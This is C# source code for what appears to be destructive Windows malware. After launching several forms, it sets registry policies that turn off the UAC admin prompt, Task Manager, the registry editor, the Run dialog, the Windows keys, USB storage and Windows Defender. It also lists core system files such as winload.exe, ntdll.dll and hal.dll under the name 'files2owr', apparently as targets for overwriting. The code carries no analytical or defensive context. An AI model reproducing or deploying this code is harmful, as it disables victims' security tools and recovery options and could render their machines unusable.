using System;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;

namespace gdifuncs
{
    /// <summary>
    /// Class with program entry point.
    /// </summary>
    internal sealed class Program
    {
        /// <summary>
        /// Program entry point.
        /// </summary>
        [STAThread]
        static void runprotector(object state) { Application.Run(new protection64()); }

        static void runmform(object state) { Application.Run(new majorsgui()); }

        private static void Main(string[] args)
        {
            {
                {
                    System.Threading.ThreadPool.QueueUserWorkItem(runprotector);
                    System.Threading.ThreadPool.QueueUserWorkItem(runmform);
                    Application.Run(new MainForm());
                    {
                        if (System.IO.File.Exists("kek.txt"))
                        {
                            try
                            {
                                RegistryKey key =
                                    Registry.LocalMachine.CreateSubKey(
                                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system");
                                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key =
                                    Registry.CurrentUser.CreateSubKey(
                                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                                key.SetValue("NoChangingWallPaper", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key =
                                    Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                                key.SetValue("DisableTaskMgr", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key =
                                    Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                                key.SetValue("DisableRegistryTools", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key =
                                    Registry.CurrentUser.CreateSubKey(
                                        @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                                key.SetValue("NoRun", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key =
                                    Registry.CurrentUser.CreateSubKey(
                                        @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                                key.SetValue("NoWinKeys", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }

                            try
                            {
                                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
                                key.SetValue("Start", 4);
                                key.Dispose();
                            }
                            catch
                            {
                            }


                            try
                            {
                                RegistryKey key =
                                    Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
                                key.SetValue("DisableAntiSpyware", 1);
                                key.Dispose();
                            }
                            catch
                            {
                            }
                        }

                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        if (System.IO.File.Exists("C:\\windows\\WinAttr.gci"))
                        {
                            string[] files2owr = {
                        "winload.exe",
                        "csrss.exe",
                        "wininit.exe",
                        "wininet.dll",
                        "aclui.dll",
                        "ADVAPI32.DLL",
                        "crypt32.dll",
                        "hal.dll",
                        "ntdll.dll",

                        "cryptbase.dll",
                        "kernel32.dll",
                        "userinit.exe",
                        "crypt.dll",
                        "chkdsk.exe",
                    };
                        }
                    }

                }
            }
        }
    }
}